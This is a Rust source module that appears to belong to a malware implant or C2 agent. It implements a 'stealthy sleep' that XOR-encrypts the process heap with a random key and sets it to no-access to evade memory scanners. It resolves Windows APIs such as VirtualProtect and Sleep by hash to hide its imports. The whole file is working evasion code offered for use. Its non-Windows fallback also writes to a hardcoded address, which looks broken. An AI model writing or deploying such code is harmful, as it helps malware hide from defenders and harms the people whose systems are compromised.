#[cfg(not(target_os = "windows"))]
use super::syscalls::{sys_nanosleep, Timespec};

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

static mut SLEEP_MASK_KEY: u8 = 0xAA;

/// Performs a stealthy sleep with heap obfuscation.
pub fn sleep(ms: u64) {
    // Generate new random key for this sleep cycle
    unsafe {
        *core::ptr::addr_of_mut!(SLEEP_MASK_KEY) = get_random_u8();
    }

    // Obfuscation: Encrypt heap memory to evade scanners during sleep
    encrypt_heap();

    #[cfg(target_os = "windows")]
    unsafe {
        let (base, size) = get_heap_range();
        // Change heap to NOACCESS
        set_memory_protection(base, size, 0x01); // PAGE_NOACCESS
    }

    #[cfg(not(target_os = "windows"))]
    {
        let req = Timespec {
            tv_sec: (ms / 1000) as i64,
            tv_nsec: ((ms % 1000) * 1_000_000) as i64,
        };
        unsafe {
            sys_nanosleep(&req, core::ptr::null_mut());
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let k32_hash = hash_str(b"KERNEL32.DLL");
            let sleep_hash = hash_str(b"Sleep");
            let fn_sleep = resolve_function(k32_hash, sleep_hash);

            if !fn_sleep.is_null() {
                type SleepFn = unsafe extern "system" fn(u32);
                let sleep: SleepFn = core::mem::transmute(fn_sleep);
                sleep(ms as u32);
            }

            let (base, size) = get_heap_range();
            // Restore heap protection
            set_memory_protection(base, size, 0x04); // PAGE_READWRITE
        }
    }

    decrypt_heap();
}

#[cfg(target_os = "windows")]
unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
    let k32_hash = hash_str(b"KERNEL32.DLL");
    let vp_hash = hash_str(b"VirtualProtect");
    let fn_vp = resolve_function(k32_hash, vp_hash);
    if !fn_vp.is_null() {
        type VirtualProtectFn = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
        let virtual_protect: VirtualProtectFn = core::mem::transmute(fn_vp);
        let mut old = 0;
        virtual_protect(base, size, protect, &mut old);
    }
}

pub fn encrypt_heap() {
    let (heap_start, heap_size) = get_heap_range();
    unsafe {
        let key = *core::ptr::addr_of!(SLEEP_MASK_KEY);
        for i in 0..heap_size {
            let ptr = heap_start.add(i);
            // XOR encryption
            *ptr ^= key;
        }
    }
}

pub fn decrypt_heap() {
    encrypt_heap(); // XOR is symmetric
}

fn get_random_u8() -> u8 {
    let mut val: u64 = 0;
    unsafe {
        core::arch::asm!(
            "rdrand {}",
            out(reg) val,
            options(nomem, nostack)
        );
    }
    (val & 0xFF) as u8
}

fn get_heap_range() -> (*mut u8, usize) {
    #[cfg(target_os = "windows")]
    unsafe {
        let kernel32 = hash_str(b"kernel32.dll");
        let get_process_heap = resolve_function(kernel32, hash_str(b"GetProcessHeap"));
        
        if !get_process_heap.is_null() {
            type FnGetProcessHeap = unsafe extern "system" fn() -> crate::utils::windows_definitions::HANDLE;
            let heap = core::mem::transmute::<_, FnGetProcessHeap>(get_process_heap)();
            // Default to 1MB from heap base as a safe approximation for obfuscation
            // Full traversal with HeapWalk is risky during sleep mask application
            return (heap as *mut u8, 1024 * 1024);
        }
    }
    // Fallback or non-windows
    (0x10000000 as *mut u8, 1024 * 1024)
}